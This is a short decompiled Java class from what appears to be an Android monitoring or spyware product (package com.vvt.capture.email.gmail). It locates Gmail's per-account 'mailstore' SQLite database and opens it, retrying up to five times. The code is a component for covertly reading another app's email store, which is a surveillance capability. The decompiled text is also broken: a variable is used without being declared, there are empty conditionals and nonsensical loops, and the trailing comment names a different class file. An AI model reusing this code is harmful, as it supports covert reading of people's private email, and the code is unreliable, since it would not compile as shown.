package com.vvt.capture.email.gmail;

import android.database.sqlite.SQLiteDatabase;
import android.os.SystemClock;
import com.vvt.ak.a;

public class c
{
  private static final boolean a;
  private static final boolean b;
  
  static
  {
    boolean bool = a.a;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      a = bool;
      b = a.e;
      return;
    }
  }
  
  private static SQLiteDatabase a(int paramInt, String paramString)
  {
    Object localObject;
    int i;
    if (paramString != null)
    {
      localObject = paramString.trim();
      i = ((String)localObject).length();
      if (i != 0) {}
    }
    else
    {
      i = 0;
      localObject = null;
    }
    for (;;)
    {
      return (SQLiteDatabase)localObject;
      boolean bool1 = a;
      if (bool1) {}
      SQLiteDatabase localSQLiteDatabase1 = b(paramInt, paramString);
      int j = 5;
      localObject = localSQLiteDatabase1;
      int m = j;
      while ((localObject == null) && (m > 0))
      {
        boolean bool2 = a;
        if (bool2) {}
        long l = 1000L;
        SystemClock.sleep(l);
        SQLiteDatabase localSQLiteDatabase2 = b(paramInt, paramString);
        int k = m + -1;
        m = k;
        localObject = localSQLiteDatabase2;
      }
    }
  }
  
  public static SQLiteDatabase a(String paramString)
  {
    return a(1, paramString);
  }
  
  public static String a(String paramString1, String paramString2)
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = paramString1;
    arrayOfObject[1] = paramString2;
    return String.format("%s/mailstore.%s.db", arrayOfObject);
  }
  
  private static SQLiteDatabase b(int paramInt, String paramString)
  {
    SQLiteDatabase localSQLiteDatabase = null;
    bool = a;
    if (bool) {}
    bool = false;
    try
    {
      localSQLiteDatabase = SQLiteDatabase.openDatabase(paramString, null, paramInt);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
    return localSQLiteDatabase;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/email/gmail/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */